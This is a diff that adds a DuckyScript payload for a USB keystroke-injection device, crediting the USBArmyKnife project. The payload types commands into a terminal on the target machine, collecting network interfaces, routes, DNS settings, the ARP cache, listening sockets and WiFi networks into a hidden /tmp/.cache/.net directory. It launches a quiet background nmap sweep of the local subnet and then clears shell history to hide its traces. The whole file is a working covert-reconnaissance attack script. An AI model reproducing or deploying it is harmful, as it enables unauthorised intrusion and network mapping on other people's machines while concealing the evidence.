@@ -1,0 +1,85 @@
+# ============================================
+# NETWORK RECON - Comprehensive Network Discovery
+# ============================================
+# Purpose: Gather network information for later analysis
+# Author: D3n14l0f53rv1c3
+# Original: https://github.com/i-am-shodan/USBArmyKnife
+# ============================================
+
+DELAY 1000
+
+# Open terminal
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+
+# Create recon directory
+STRING mkdir -p /tmp/.cache/.net && cd /tmp/.cache/.net
+ENTER
+DELAY 300
+
+# Network interfaces
+STRING echo "=== INTERFACES ===" > recon.txt
+ENTER
+DELAY 100
+STRING ip addr show >> recon.txt
+ENTER
+DELAY 300
+
+# Routing table
+STRING echo "=== ROUTING ===" >> recon.txt
+ENTER
+DELAY 100
+STRING ip route show >> recon.txt
+ENTER
+DELAY 300
+
+# DNS servers
+STRING echo "=== DNS ===" >> recon.txt
+ENTER
+DELAY 100
+STRING cat /etc/resolv.conf >> recon.txt
+ENTER
+DELAY 300
+
+# ARP cache
+STRING echo "=== ARP ===" >> recon.txt
+ENTER
+DELAY 100
+STRING ip neigh show >> recon.txt
+ENTER
+DELAY 500
+
+# Active connections
+STRING echo "=== CONNECTIONS ===" >> recon.txt
+ENTER
+DELAY 100
+STRING ss -tulpn >> recon.txt
+ENTER
+DELAY 500
+
+# WiFi networks (if available)
+STRING echo "=== WIFI ===" >> recon.txt
+ENTER
+DELAY 100
+STRING nmcli device wifi list 2>/dev/null >> recon.txt
+ENTER
+DELAY 2000
+
+# Local network scan (quiet)
+STRING nmap -sn 192.168.1.0/24 -oN hosts.txt 2>/dev/null &
+ENTER
+DELAY 100
+
+# Clean up
+STRING history -c
+ENTER
+DELAY 100
+STRING clear
+ENTER
+
+# Signal completion
+STRING echo "Network recon complete"
+ENTER
